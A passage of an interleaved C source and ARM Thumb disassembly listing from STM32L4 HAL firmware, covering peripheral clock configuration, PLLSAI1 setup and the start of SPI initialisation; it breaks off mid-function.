    assert_param(IS_RCC_RNGCLKSOURCE(PeriphClkInit->RngClockSelection));
    __HAL_RCC_RNG_CONFIG(PeriphClkInit->RngClockSelection);
 800483e:	4b31      	ldr	r3, [pc, #196]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004840:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 8004844:	f023 6240 	bic.w	r2, r3, #201326592	; 0xc000000
 8004848:	687b      	ldr	r3, [r7, #4]
 800484a:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 800484c:	492d      	ldr	r1, [pc, #180]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800484e:	4313      	orrs	r3, r2
 8004850:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

    if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLL)
 8004854:	687b      	ldr	r3, [r7, #4]
 8004856:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004858:	f1b3 6f00 	cmp.w	r3, #134217728	; 0x8000000
 800485c:	d106      	bne.n	800486c <HAL_RCCEx_PeriphCLKConfig+0x350>
    {
      /* Enable PLL48M1CLK output clock */
      __HAL_RCC_PLLCLKOUT_ENABLE(RCC_PLL_48M1CLK);
 800485e:	4b29      	ldr	r3, [pc, #164]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004860:	68db      	ldr	r3, [r3, #12]
 8004862:	4a28      	ldr	r2, [pc, #160]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 8004864:	f443 1380 	orr.w	r3, r3, #1048576	; 0x100000
 8004868:	60d3      	str	r3, [r2, #12]
 800486a:	e011      	b.n	8004890 <HAL_RCCEx_PeriphCLKConfig+0x374>
    }
#if defined(RCC_PLLSAI1_SUPPORT)
    else if(PeriphClkInit->RngClockSelection == RCC_RNGCLKSOURCE_PLLSAI1)
 800486c:	687b      	ldr	r3, [r7, #4]
 800486e:	6c5b      	ldr	r3, [r3, #68]	; 0x44
 8004870:	f1b3 6f80 	cmp.w	r3, #67108864	; 0x4000000
 8004874:	d10c      	bne.n	8004890 <HAL_RCCEx_PeriphCLKConfig+0x374>
    {
      /* PLLSAI1 input clock, parameters M, N & Q configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_Q_UPDATE);
 8004876:	687b      	ldr	r3, [r7, #4]
 8004878:	3304      	adds	r3, #4
 800487a:	2101      	movs	r1, #1
 800487c:	4618      	mov	r0, r3
 800487e:	f000 f853 	bl	8004928 <RCCEx_PLLSAI1_Config>
 8004882:	4603      	mov	r3, r0
 8004884:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 8004886:	7cfb      	ldrb	r3, [r7, #19]
 8004888:	2b00      	cmp	r3, #0
 800488a:	d001      	beq.n	8004890 <HAL_RCCEx_PeriphCLKConfig+0x374>
      {
        /* set overall return value */
        status = ret;
 800488c:	7cfb      	ldrb	r3, [r7, #19]
 800488e:	74bb      	strb	r3, [r7, #18]
    }
  }

  /*-------------------------- ADC clock source configuration ----------------------*/
#if !defined(STM32L412xx) && !defined(STM32L422xx)
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_ADC) == RCC_PERIPHCLK_ADC)
 8004890:	687b      	ldr	r3, [r7, #4]
 8004892:	681b      	ldr	r3, [r3, #0]
 8004894:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 8004898:	2b00      	cmp	r3, #0
 800489a:	d01c      	beq.n	80048d6 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
  {
    /* Check the parameters */
    assert_param(IS_RCC_ADCCLKSOURCE(PeriphClkInit->AdcClockSelection));

    /* Configure the ADC interface clock source */
    __HAL_RCC_ADC_CONFIG(PeriphClkInit->AdcClockSelection);
 800489c:	4b19      	ldr	r3, [pc, #100]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 800489e:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048a2:	f023 5240 	bic.w	r2, r3, #805306368	; 0x30000000
 80048a6:	687b      	ldr	r3, [r7, #4]
 80048a8:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 80048aa:	4916      	ldr	r1, [pc, #88]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048ac:	4313      	orrs	r3, r2
 80048ae:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88

#if defined(RCC_PLLSAI1_SUPPORT)
    if(PeriphClkInit->AdcClockSelection == RCC_ADCCLKSOURCE_PLLSAI1)
 80048b2:	687b      	ldr	r3, [r7, #4]
 80048b4:	6c9b      	ldr	r3, [r3, #72]	; 0x48
 80048b6:	f1b3 5f80 	cmp.w	r3, #268435456	; 0x10000000
 80048ba:	d10c      	bne.n	80048d6 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
    {
      /* PLLSAI1 input clock, parameters M, N & R configuration and clock output (PLLSAI1ClockOut) */
      ret = RCCEx_PLLSAI1_Config(&(PeriphClkInit->PLLSAI1), DIVIDER_R_UPDATE);
 80048bc:	687b      	ldr	r3, [r7, #4]
 80048be:	3304      	adds	r3, #4
 80048c0:	2102      	movs	r1, #2
 80048c2:	4618      	mov	r0, r3
 80048c4:	f000 f830 	bl	8004928 <RCCEx_PLLSAI1_Config>
 80048c8:	4603      	mov	r3, r0
 80048ca:	74fb      	strb	r3, [r7, #19]

      if(ret != HAL_OK)
 80048cc:	7cfb      	ldrb	r3, [r7, #19]
 80048ce:	2b00      	cmp	r3, #0
 80048d0:	d001      	beq.n	80048d6 <HAL_RCCEx_PeriphCLKConfig+0x3ba>
      {
        /* set overall return value */
        status = ret;
 80048d2:	7cfb      	ldrb	r3, [r7, #19]
 80048d4:	74bb      	strb	r3, [r7, #18]
#endif /* !STM32L412xx && !STM32L422xx */

#if defined(SWPMI1)

  /*-------------------------- SWPMI1 clock source configuration -------------------*/
  if(((PeriphClkInit->PeriphClockSelection) & RCC_PERIPHCLK_SWPMI1) == RCC_PERIPHCLK_SWPMI1)
 80048d6:	687b      	ldr	r3, [r7, #4]
 80048d8:	681b      	ldr	r3, [r3, #0]
 80048da:	f403 4300 	and.w	r3, r3, #32768	; 0x8000
 80048de:	2b00      	cmp	r3, #0
 80048e0:	d00a      	beq.n	80048f8 <HAL_RCCEx_PeriphCLKConfig+0x3dc>
  {
    /* Check the parameters */
    assert_param(IS_RCC_SWPMI1CLKSOURCE(PeriphClkInit->Swpmi1ClockSelection));

    /* Configure the SWPMI1 clock source */
    __HAL_RCC_SWPMI1_CONFIG(PeriphClkInit->Swpmi1ClockSelection);
 80048e2:	4b08      	ldr	r3, [pc, #32]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048e4:	f8d3 3088 	ldr.w	r3, [r3, #136]	; 0x88
 80048e8:	f023 4280 	bic.w	r2, r3, #1073741824	; 0x40000000
 80048ec:	687b      	ldr	r3, [r7, #4]
 80048ee:	6cdb      	ldr	r3, [r3, #76]	; 0x4c
 80048f0:	4904      	ldr	r1, [pc, #16]	; (8004904 <HAL_RCCEx_PeriphCLKConfig+0x3e8>)
 80048f2:	4313      	orrs	r3, r2
 80048f4:	f8c1 3088 	str.w	r3, [r1, #136]	; 0x88
    }
  }

#endif /* OCTOSPI1 || OCTOSPI2 */

  return status;
 80048f8:	7cbb      	ldrb	r3, [r7, #18]
}
 80048fa:	4618      	mov	r0, r3
 80048fc:	3718      	adds	r7, #24
 80048fe:	46bd      	mov	sp, r7
 8004900:	bd80      	pop	{r7, pc}
 8004902:	bf00      	nop
 8004904:	40021000 	.word	0x40021000

08004908 <HAL_RCCEx_EnableMSIPLLMode>:
  * @note   Prior to enable the PLL-mode of the MSI for automatic hardware
  *         calibration LSE oscillator is to be enabled with HAL_RCC_OscConfig().
  * @retval None
  */
void HAL_RCCEx_EnableMSIPLLMode(void)
{
 8004908:	b480      	push	{r7}
 800490a:	af00      	add	r7, sp, #0
  SET_BIT(RCC->CR, RCC_CR_MSIPLLEN) ;
 800490c:	4b05      	ldr	r3, [pc, #20]	; (8004924 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 800490e:	681b      	ldr	r3, [r3, #0]
 8004910:	4a04      	ldr	r2, [pc, #16]	; (8004924 <HAL_RCCEx_EnableMSIPLLMode+0x1c>)
 8004912:	f043 0304 	orr.w	r3, r3, #4
 8004916:	6013      	str	r3, [r2, #0]
}
 8004918:	bf00      	nop
 800491a:	46bd      	mov	sp, r7
 800491c:	f85d 7b04 	ldr.w	r7, [sp], #4
 8004920:	4770      	bx	lr
 8004922:	bf00      	nop
 8004924:	40021000 	.word	0x40021000

08004928 <RCCEx_PLLSAI1_Config>:
  * @note   PLLSAI1 is temporary disable to apply new parameters
  *
  * @retval HAL status
  */
static HAL_StatusTypeDef RCCEx_PLLSAI1_Config(RCC_PLLSAI1InitTypeDef *PllSai1, uint32_t Divider)
{
 8004928:	b580      	push	{r7, lr}
 800492a:	b084      	sub	sp, #16
 800492c:	af00      	add	r7, sp, #0
 800492e:	6078      	str	r0, [r7, #4]
 8004930:	6039      	str	r1, [r7, #0]
  uint32_t tickstart;
  HAL_StatusTypeDef status = HAL_OK;
 8004932:	2300      	movs	r3, #0
 8004934:	73fb      	strb	r3, [r7, #15]
  assert_param(IS_RCC_PLLSAI1M_VALUE(PllSai1->PLLSAI1M));
  assert_param(IS_RCC_PLLSAI1N_VALUE(PllSai1->PLLSAI1N));
  assert_param(IS_RCC_PLLSAI1CLOCKOUT_VALUE(PllSai1->PLLSAI1ClockOut));

  /* Check that PLLSAI1 clock source and divider M can be applied */
  if(__HAL_RCC_GET_PLL_OSCSOURCE() != RCC_PLLSOURCE_NONE)
 8004936:	4b74      	ldr	r3, [pc, #464]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004938:	68db      	ldr	r3, [r3, #12]
 800493a:	f003 0303 	and.w	r3, r3, #3
 800493e:	2b00      	cmp	r3, #0
 8004940:	d018      	beq.n	8004974 <RCCEx_PLLSAI1_Config+0x4c>
  {
    /* PLL clock source and divider M already set, check that no request for change  */
    if((__HAL_RCC_GET_PLL_OSCSOURCE() != PllSai1->PLLSAI1Source)
 8004942:	4b71      	ldr	r3, [pc, #452]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004944:	68db      	ldr	r3, [r3, #12]
 8004946:	f003 0203 	and.w	r2, r3, #3
 800494a:	687b      	ldr	r3, [r7, #4]
 800494c:	681b      	ldr	r3, [r3, #0]
 800494e:	429a      	cmp	r2, r3
 8004950:	d10d      	bne.n	800496e <RCCEx_PLLSAI1_Config+0x46>
       ||
       (PllSai1->PLLSAI1Source == RCC_PLLSOURCE_NONE)
 8004952:	687b      	ldr	r3, [r7, #4]
 8004954:	681b      	ldr	r3, [r3, #0]
       ||
 8004956:	2b00      	cmp	r3, #0
 8004958:	d009      	beq.n	800496e <RCCEx_PLLSAI1_Config+0x46>
#if !defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
       ||
       (((READ_BIT(RCC->PLLCFGR, RCC_PLLCFGR_PLLM) >> RCC_PLLCFGR_PLLM_Pos) + 1U) != PllSai1->PLLSAI1M)
 800495a:	4b6b      	ldr	r3, [pc, #428]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 800495c:	68db      	ldr	r3, [r3, #12]
 800495e:	091b      	lsrs	r3, r3, #4
 8004960:	f003 0307 	and.w	r3, r3, #7
 8004964:	1c5a      	adds	r2, r3, #1
 8004966:	687b      	ldr	r3, [r7, #4]
 8004968:	685b      	ldr	r3, [r3, #4]
       ||
 800496a:	429a      	cmp	r2, r3
 800496c:	d047      	beq.n	80049fe <RCCEx_PLLSAI1_Config+0xd6>
#endif
      )
    {
      status = HAL_ERROR;
 800496e:	2301      	movs	r3, #1
 8004970:	73fb      	strb	r3, [r7, #15]
 8004972:	e044      	b.n	80049fe <RCCEx_PLLSAI1_Config+0xd6>
    }
  }
  else
  {
    /* Check PLLSAI1 clock source availability */
    switch(PllSai1->PLLSAI1Source)
 8004974:	687b      	ldr	r3, [r7, #4]
 8004976:	681b      	ldr	r3, [r3, #0]
 8004978:	2b03      	cmp	r3, #3
 800497a:	d018      	beq.n	80049ae <RCCEx_PLLSAI1_Config+0x86>
 800497c:	2b03      	cmp	r3, #3
 800497e:	d825      	bhi.n	80049cc <RCCEx_PLLSAI1_Config+0xa4>
 8004980:	2b01      	cmp	r3, #1
 8004982:	d002      	beq.n	800498a <RCCEx_PLLSAI1_Config+0x62>
 8004984:	2b02      	cmp	r3, #2
 8004986:	d009      	beq.n	800499c <RCCEx_PLLSAI1_Config+0x74>
 8004988:	e020      	b.n	80049cc <RCCEx_PLLSAI1_Config+0xa4>
    {
    case RCC_PLLSOURCE_MSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_MSIRDY))
 800498a:	4b5f      	ldr	r3, [pc, #380]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 800498c:	681b      	ldr	r3, [r3, #0]
 800498e:	f003 0302 	and.w	r3, r3, #2
 8004992:	2b00      	cmp	r3, #0
 8004994:	d11d      	bne.n	80049d2 <RCCEx_PLLSAI1_Config+0xaa>
      {
        status = HAL_ERROR;
 8004996:	2301      	movs	r3, #1
 8004998:	73fb      	strb	r3, [r7, #15]
      }
      break;
 800499a:	e01a      	b.n	80049d2 <RCCEx_PLLSAI1_Config+0xaa>
    case RCC_PLLSOURCE_HSI:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSIRDY))
 800499c:	4b5a      	ldr	r3, [pc, #360]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 800499e:	681b      	ldr	r3, [r3, #0]
 80049a0:	f403 6380 	and.w	r3, r3, #1024	; 0x400
 80049a4:	2b00      	cmp	r3, #0
 80049a6:	d116      	bne.n	80049d6 <RCCEx_PLLSAI1_Config+0xae>
      {
        status = HAL_ERROR;
 80049a8:	2301      	movs	r3, #1
 80049aa:	73fb      	strb	r3, [r7, #15]
      }
      break;
 80049ac:	e013      	b.n	80049d6 <RCCEx_PLLSAI1_Config+0xae>
    case RCC_PLLSOURCE_HSE:
      if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSERDY))
 80049ae:	4b56      	ldr	r3, [pc, #344]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049b0:	681b      	ldr	r3, [r3, #0]
 80049b2:	f403 3300 	and.w	r3, r3, #131072	; 0x20000
 80049b6:	2b00      	cmp	r3, #0
 80049b8:	d10f      	bne.n	80049da <RCCEx_PLLSAI1_Config+0xb2>
      {
        if(HAL_IS_BIT_CLR(RCC->CR, RCC_CR_HSEBYP))
 80049ba:	4b53      	ldr	r3, [pc, #332]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049bc:	681b      	ldr	r3, [r3, #0]
 80049be:	f403 2380 	and.w	r3, r3, #262144	; 0x40000
 80049c2:	2b00      	cmp	r3, #0
 80049c4:	d109      	bne.n	80049da <RCCEx_PLLSAI1_Config+0xb2>
        {
          status = HAL_ERROR;
 80049c6:	2301      	movs	r3, #1
 80049c8:	73fb      	strb	r3, [r7, #15]
        }
      }
      break;
 80049ca:	e006      	b.n	80049da <RCCEx_PLLSAI1_Config+0xb2>
    default:
      status = HAL_ERROR;
 80049cc:	2301      	movs	r3, #1
 80049ce:	73fb      	strb	r3, [r7, #15]
      break;
 80049d0:	e004      	b.n	80049dc <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049d2:	bf00      	nop
 80049d4:	e002      	b.n	80049dc <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049d6:	bf00      	nop
 80049d8:	e000      	b.n	80049dc <RCCEx_PLLSAI1_Config+0xb4>
      break;
 80049da:	bf00      	nop
    }

    if(status == HAL_OK)
 80049dc:	7bfb      	ldrb	r3, [r7, #15]
 80049de:	2b00      	cmp	r3, #0
 80049e0:	d10d      	bne.n	80049fe <RCCEx_PLLSAI1_Config+0xd6>
#if defined(RCC_PLLSAI1M_DIV_1_16_SUPPORT)
      /* Set PLLSAI1 clock source */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC, PllSai1->PLLSAI1Source);
#else
      /* Set PLLSAI1 clock source and divider M */
      MODIFY_REG(RCC->PLLCFGR, RCC_PLLCFGR_PLLSRC | RCC_PLLCFGR_PLLM, PllSai1->PLLSAI1Source | (PllSai1->PLLSAI1M - 1U) << RCC_PLLCFGR_PLLM_Pos);
 80049e2:	4b49      	ldr	r3, [pc, #292]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049e4:	68db      	ldr	r3, [r3, #12]
 80049e6:	f023 0273 	bic.w	r2, r3, #115	; 0x73
 80049ea:	687b      	ldr	r3, [r7, #4]
 80049ec:	6819      	ldr	r1, [r3, #0]
 80049ee:	687b      	ldr	r3, [r7, #4]
 80049f0:	685b      	ldr	r3, [r3, #4]
 80049f2:	3b01      	subs	r3, #1
 80049f4:	011b      	lsls	r3, r3, #4
 80049f6:	430b      	orrs	r3, r1
 80049f8:	4943      	ldr	r1, [pc, #268]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 80049fa:	4313      	orrs	r3, r2
 80049fc:	60cb      	str	r3, [r1, #12]
#endif
    }
  }

  if(status == HAL_OK)
 80049fe:	7bfb      	ldrb	r3, [r7, #15]
 8004a00:	2b00      	cmp	r3, #0
 8004a02:	d17c      	bne.n	8004afe <RCCEx_PLLSAI1_Config+0x1d6>
  {
    /* Disable the PLLSAI1 */
    __HAL_RCC_PLLSAI1_DISABLE();
 8004a04:	4b40      	ldr	r3, [pc, #256]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a06:	681b      	ldr	r3, [r3, #0]
 8004a08:	4a3f      	ldr	r2, [pc, #252]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a0a:	f023 6380 	bic.w	r3, r3, #67108864	; 0x4000000
 8004a0e:	6013      	str	r3, [r2, #0]

    /* Get Start Tick*/
    tickstart = HAL_GetTick();
 8004a10:	f7fc fbc8 	bl	80011a4 <HAL_GetTick>
 8004a14:	60b8      	str	r0, [r7, #8]

    /* Wait till PLLSAI1 is ready to be updated */
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a16:	e009      	b.n	8004a2c <RCCEx_PLLSAI1_Config+0x104>
    {
      if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004a18:	f7fc fbc4 	bl	80011a4 <HAL_GetTick>
 8004a1c:	4602      	mov	r2, r0
 8004a1e:	68bb      	ldr	r3, [r7, #8]
 8004a20:	1ad3      	subs	r3, r2, r3
 8004a22:	2b02      	cmp	r3, #2
 8004a24:	d902      	bls.n	8004a2c <RCCEx_PLLSAI1_Config+0x104>
      {
        status = HAL_TIMEOUT;
 8004a26:	2303      	movs	r3, #3
 8004a28:	73fb      	strb	r3, [r7, #15]
        break;
 8004a2a:	e005      	b.n	8004a38 <RCCEx_PLLSAI1_Config+0x110>
    while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) != 0U)
 8004a2c:	4b36      	ldr	r3, [pc, #216]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a2e:	681b      	ldr	r3, [r3, #0]
 8004a30:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004a34:	2b00      	cmp	r3, #0
 8004a36:	d1ef      	bne.n	8004a18 <RCCEx_PLLSAI1_Config+0xf0>
      }
    }

    if(status == HAL_OK)
 8004a38:	7bfb      	ldrb	r3, [r7, #15]
 8004a3a:	2b00      	cmp	r3, #0
 8004a3c:	d15f      	bne.n	8004afe <RCCEx_PLLSAI1_Config+0x1d6>
    {
      if(Divider == DIVIDER_P_UPDATE)
 8004a3e:	683b      	ldr	r3, [r7, #0]
 8004a40:	2b00      	cmp	r3, #0
 8004a42:	d110      	bne.n	8004a66 <RCCEx_PLLSAI1_Config+0x13e>
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#else
        /* Configure the PLLSAI1 Division factor P and Multiplication factor N*/
#if defined(RCC_PLLSAI1P_DIV_2_31_SUPPORT)
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a44:	4b30      	ldr	r3, [pc, #192]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a46:	691b      	ldr	r3, [r3, #16]
 8004a48:	f023 4378 	bic.w	r3, r3, #4160749568	; 0xf8000000
 8004a4c:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a50:	687a      	ldr	r2, [r7, #4]
 8004a52:	6892      	ldr	r2, [r2, #8]
 8004a54:	0211      	lsls	r1, r2, #8
 8004a56:	687a      	ldr	r2, [r7, #4]
 8004a58:	68d2      	ldr	r2, [r2, #12]
 8004a5a:	06d2      	lsls	r2, r2, #27
 8004a5c:	430a      	orrs	r2, r1
 8004a5e:	492a      	ldr	r1, [pc, #168]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a60:	4313      	orrs	r3, r2
 8004a62:	610b      	str	r3, [r1, #16]
 8004a64:	e027      	b.n	8004ab6 <RCCEx_PLLSAI1_Config+0x18e>
                   ((PllSai1->PLLSAI1P >> 4U) << RCC_PLLSAI1CFGR_PLLSAI1P_Pos));
#endif /* RCC_PLLSAI1P_DIV_2_31_SUPPORT */

#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }
      else if(Divider == DIVIDER_Q_UPDATE)
 8004a66:	683b      	ldr	r3, [r7, #0]
 8004a68:	2b01      	cmp	r3, #1
 8004a6a:	d112      	bne.n	8004a92 <RCCEx_PLLSAI1_Config+0x16a>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1Q >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1Q_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor Q and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a6c:	4b26      	ldr	r3, [pc, #152]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a6e:	691b      	ldr	r3, [r3, #16]
 8004a70:	f423 03c0 	bic.w	r3, r3, #6291456	; 0x600000
 8004a74:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a78:	687a      	ldr	r2, [r7, #4]
 8004a7a:	6892      	ldr	r2, [r2, #8]
 8004a7c:	0211      	lsls	r1, r2, #8
 8004a7e:	687a      	ldr	r2, [r7, #4]
 8004a80:	6912      	ldr	r2, [r2, #16]
 8004a82:	0852      	lsrs	r2, r2, #1
 8004a84:	3a01      	subs	r2, #1
 8004a86:	0552      	lsls	r2, r2, #21
 8004a88:	430a      	orrs	r2, r1
 8004a8a:	491f      	ldr	r1, [pc, #124]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a8c:	4313      	orrs	r3, r2
 8004a8e:	610b      	str	r3, [r1, #16]
 8004a90:	e011      	b.n	8004ab6 <RCCEx_PLLSAI1_Config+0x18e>
                   (PllSai1->PLLSAI1N << RCC_PLLSAI1CFGR_PLLSAI1N_Pos) |
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos) |
                   ((PllSai1->PLLSAI1M - 1U) << RCC_PLLSAI1CFGR_PLLSAI1M_Pos));
#else
        /* Configure the PLLSAI1 Division factor R and Multiplication factor N*/
        MODIFY_REG(RCC->PLLSAI1CFGR,
 8004a92:	4b1d      	ldr	r3, [pc, #116]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004a94:	691b      	ldr	r3, [r3, #16]
 8004a96:	f023 63c0 	bic.w	r3, r3, #100663296	; 0x6000000
 8004a9a:	f423 43fe 	bic.w	r3, r3, #32512	; 0x7f00
 8004a9e:	687a      	ldr	r2, [r7, #4]
 8004aa0:	6892      	ldr	r2, [r2, #8]
 8004aa2:	0211      	lsls	r1, r2, #8
 8004aa4:	687a      	ldr	r2, [r7, #4]
 8004aa6:	6952      	ldr	r2, [r2, #20]
 8004aa8:	0852      	lsrs	r2, r2, #1
 8004aaa:	3a01      	subs	r2, #1
 8004aac:	0652      	lsls	r2, r2, #25
 8004aae:	430a      	orrs	r2, r1
 8004ab0:	4915      	ldr	r1, [pc, #84]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ab2:	4313      	orrs	r3, r2
 8004ab4:	610b      	str	r3, [r1, #16]
                   (((PllSai1->PLLSAI1R >> 1U) - 1U) << RCC_PLLSAI1CFGR_PLLSAI1R_Pos));
#endif /* RCC_PLLSAI1M_DIV_1_16_SUPPORT */
      }

      /* Enable the PLLSAI1 again by setting PLLSAI1ON to 1*/
      __HAL_RCC_PLLSAI1_ENABLE();
 8004ab6:	4b14      	ldr	r3, [pc, #80]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ab8:	681b      	ldr	r3, [r3, #0]
 8004aba:	4a13      	ldr	r2, [pc, #76]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004abc:	f043 6380 	orr.w	r3, r3, #67108864	; 0x4000000
 8004ac0:	6013      	str	r3, [r2, #0]

      /* Get Start Tick*/
      tickstart = HAL_GetTick();
 8004ac2:	f7fc fb6f 	bl	80011a4 <HAL_GetTick>
 8004ac6:	60b8      	str	r0, [r7, #8]

      /* Wait till PLLSAI1 is ready */
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ac8:	e009      	b.n	8004ade <RCCEx_PLLSAI1_Config+0x1b6>
      {
        if((HAL_GetTick() - tickstart) > PLLSAI1_TIMEOUT_VALUE)
 8004aca:	f7fc fb6b 	bl	80011a4 <HAL_GetTick>
 8004ace:	4602      	mov	r2, r0
 8004ad0:	68bb      	ldr	r3, [r7, #8]
 8004ad2:	1ad3      	subs	r3, r2, r3
 8004ad4:	2b02      	cmp	r3, #2
 8004ad6:	d902      	bls.n	8004ade <RCCEx_PLLSAI1_Config+0x1b6>
        {
          status = HAL_TIMEOUT;
 8004ad8:	2303      	movs	r3, #3
 8004ada:	73fb      	strb	r3, [r7, #15]
          break;
 8004adc:	e005      	b.n	8004aea <RCCEx_PLLSAI1_Config+0x1c2>
      while(READ_BIT(RCC->CR, RCC_CR_PLLSAI1RDY) == 0U)
 8004ade:	4b0a      	ldr	r3, [pc, #40]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004ae0:	681b      	ldr	r3, [r3, #0]
 8004ae2:	f003 6300 	and.w	r3, r3, #134217728	; 0x8000000
 8004ae6:	2b00      	cmp	r3, #0
 8004ae8:	d0ef      	beq.n	8004aca <RCCEx_PLLSAI1_Config+0x1a2>
        }
      }

      if(status == HAL_OK)
 8004aea:	7bfb      	ldrb	r3, [r7, #15]
 8004aec:	2b00      	cmp	r3, #0
 8004aee:	d106      	bne.n	8004afe <RCCEx_PLLSAI1_Config+0x1d6>
      {
        /* Configure the PLLSAI1 Clock output(s) */
        __HAL_RCC_PLLSAI1CLKOUT_ENABLE(PllSai1->PLLSAI1ClockOut);
 8004af0:	4b05      	ldr	r3, [pc, #20]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004af2:	691a      	ldr	r2, [r3, #16]
 8004af4:	687b      	ldr	r3, [r7, #4]
 8004af6:	699b      	ldr	r3, [r3, #24]
 8004af8:	4903      	ldr	r1, [pc, #12]	; (8004b08 <RCCEx_PLLSAI1_Config+0x1e0>)
 8004afa:	4313      	orrs	r3, r2
 8004afc:	610b      	str	r3, [r1, #16]
      }
    }
  }

  return status;
 8004afe:	7bfb      	ldrb	r3, [r7, #15]
}
 8004b00:	4618      	mov	r0, r3
 8004b02:	3710      	adds	r7, #16
 8004b04:	46bd      	mov	sp, r7
 8004b06:	bd80      	pop	{r7, pc}
 8004b08:	40021000 	.word	0x40021000

08004b0c <HAL_SPI_Init>:
  * @param  hspi pointer to a SPI_HandleTypeDef structure that contains
  *               the configuration information for SPI module.
  * @retval HAL status
  */
HAL_StatusTypeDef HAL_SPI_Init(SPI_HandleTypeDef *hspi)
{
 8004b0c:	b580      	push	{r7, lr}
 8004b0e:	b084      	sub	sp, #16
 8004b10:	af00      	add	r7, sp, #0
 8004b12:	6078      	str	r0, [r7, #4]
  uint32_t frxth;

  /* Check the SPI handle allocation */
  if (hspi == NULL)
 8004b14:	687b      	ldr	r3, [r7, #4]
 8004b16:	2b00      	cmp	r3, #0
 8004b18:	d101      	bne.n	8004b1e <HAL_SPI_Init+0x12>
  {
    return HAL_ERROR;
 8004b1a:	2301      	movs	r3, #1
 8004b1c:	e095      	b.n	8004c4a <HAL_SPI_Init+0x13e>
  assert_param(IS_SPI_NSS(hspi->Init.NSS));
  assert_param(IS_SPI_NSSP(hspi->Init.NSSPMode));
  assert_param(IS_SPI_BAUDRATE_PRESCALER(hspi->Init.BaudRatePrescaler));
  assert_param(IS_SPI_FIRST_BIT(hspi->Init.FirstBit));
  assert_param(IS_SPI_TIMODE(hspi->Init.TIMode));
  if (hspi->Init.TIMode == SPI_TIMODE_DISABLE)
 8004b1e:	687b      	ldr	r3, [r7, #4]
 8004b20:	6a5b      	ldr	r3, [r3, #36]	; 0x24
 8004b22:	2b00      	cmp	r3, #0
 8004b24:	d108      	bne.n	8004b38 <HAL_SPI_Init+0x2c>
  {
